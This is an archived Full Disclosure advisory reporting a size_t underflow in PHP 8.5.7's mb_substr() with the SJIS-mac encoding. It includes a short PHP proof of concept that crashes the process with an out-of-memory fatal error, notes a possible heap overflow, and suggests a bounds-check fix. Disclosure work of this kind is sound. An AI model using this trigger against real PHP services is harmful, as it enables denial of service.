---
title: PHP 8.5.7 `mb_substr()` 'SJIS-mac' size_t underflow
url: https://seclists.org/fulldisclosure/2026/Jun/12
source: Full Disclosure
date: 2026-06-21
fetch_date: 2026-06-22T07:17:02.265659
---

# PHP 8.5.7 `mb_substr()` 'SJIS-mac' size_t underflow

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](11)
[By Date](date.html#12)
[![Next](/images/right-icon-16x16.png)](13)

[![Previous](/images/left-icon-16x16.png)](11)
[By Thread](index.html#12)
[![Next](/images/right-icon-16x16.png)](13)

![](/shared/images/nst-icons.svg#search)

# PHP 8.5.7 `mb\_substr()` 'SJIS-mac' size\_t underflow

---

*From*: Khashayar Fereidani <info () fereidani com>
*Date*: Fri, 19 Jun 2026 09:53:43 +0330

---

```
# PHP 8.5.7 `mb_substr()` 'SJIS-mac' size_t underflow

**Author:** Khashayar Fereidani
**Disclosure Date:** 2026-06-18
**Advisory:** https://fereidani.com/php-857-mbsubstr-sjis-mac-sizet-underflow
**Contact:** https://fereidani.com/contact

## Description

The `mb_get_substr()` function in `ext/mbstring/mbstring.c`
deliberately skips an early empty return guard for the `SJIS-mac`
encoding when `from >= in_len`. As a result, it falls through to
`mb_get_substr_slow()`, executing `mb_convert_buf_init(&buf, MIN(len,
in_len - from), ...);`. When `from > in_len`, the parameter `in_len -
from` underflows the `size_t` representation, resulting in a vastly
large allocation size (near ~2^64 bytes). This leads to an immediate
Out-Of-Memory (OOM) fatal error. Furthermore, if
`_ZSTR_STRUCT_SIZE(initsize)` wraps past `SIZE_MAX`, it could
potentially allocate a tiny buffer while the structural limit retains
the pseudo-wild value, resulting in a heap buffer overflow when
subsequent codepoints are decoded and written.

## Proof of concept

```php
<?php
/*
 * PoC: mb_substr() 'SJIS-mac' size_t underflow
 * File:  ext/mbstring/mbstring.c  mb_get_substr() (~L2129) +
mb_get_substr_slow() (~L2102) *
 * mb_get_substr() deliberately skips the early "return empty" guard
for SJIS-mac:
 *
 *     if (len == 0 || (from >= in_len && enc != &mbfl_encoding_sjis_mac)) {
 *         return zend_empty_string;     // <-- sjis_mac bypasses this
when from >= in_len
 *     }
 *
 * ... then falls through (sjis_mac is multibyte, not SBCS/WCS2/WCS4) to
 * mb_get_substr_slow(), whose first line is:
 *
 *     mb_convert_buf_init(&buf, MIN(len, in_len - from), ...);
 *
 * With `from > in_len` (bytes), `in_len - from` UNDERFLOWS size_t to ~2^64.
 * mb_convert_buf_init does emalloc(_ZSTR_STRUCT_SIZE(initsize)).
 *
 * Two outcomes, both wrong (correct result is the empty string):
 *  (A) `from` huge -> initsize ~2^64 -> fatal "Allowed memory size exhausted
 *      (tried to allocate 18446744073708551644 bytes)". CONFIRMED below.
 *  (B) `from` only slightly > in_len -> initsize sits just under 2^64 and
 *      _ZSTR_STRUCT_SIZE(initsize) WRAPS past SIZE_MAX to a tiny allocation,
 *      while buf->limit = out + initsize stays wild -> a subsequent write of
 *      decoded codepoints is a HEAP OVERFLOW. (Harder to trigger reliably:
 *      needs a SJIS-mac input decoding to more codepoints than bytes, i.e.
 *      from < codepoint_count while from > byte_count. Worth upstream review.)
 */
echo "PHP ", PHP_VERSION, "  sjis_mac available: ",
     (in_array("SJIS-mac", mb_list_encodings()) ? "yes" : "no"), "\n\n";

/* control: a normal encoding with from > strlen returns "" cleanly */
echo "UTF-8, from=10 > strlen('abc'): -> "; var_dump(@mb_substr("abc",
10, null, "UTF-8"));

/* The bug: SJIS-mac, from >> strlen, length omitted -> underflow -> OOM fatal.
 * The "tried to allocate 18...644 bytes" is literally (size_t)(3 - 1000000). */
echo "SJIS-mac, from=1000000 > strlen('abc'):\n";
@mb_substr("abc", 1000000, null, "SJIS-mac");
echo "(if you see this line, the fatal error above was caught/suppressed)\n";
```

## Impact

An attacker could intentionally furnish conditions where `from >
in_len` alongside the 'SJIS-mac' encoding, triggering a `size_t`
underflow. This predictably causes a severe Out-Of-Memory (OOM) fatal
error, culminating in a Denial of Service. Depending on environmental
details, it might hypothetically cause a heap buffer overflow.

## Solution

Adjust the constraints inside `mb_get_substr()` and
`mb_get_substr_slow()` in `ext/mbstring/mbstring.c`. The calculation
`in_len - from` should be adequately bounds-checked to halt
computation or safely cap at zero when `from > in_len`, sidestepping
the underflow when initializing string buffers.
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](11)
[By Date](date.html#12)
[![Next](/images/right-icon-16x16.png)](13)

[![Previous](/images/left-icon-16x16.png)](11)
[By Thread](index.html#12)
[![Next](/images/right-icon-16x16.png)](13)

### Current thread:

* **PHP 8.5.7 `mb\_substr()` 'SJIS-mac' size\_t underflow** *Khashayar Fereidani (Jun 20)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")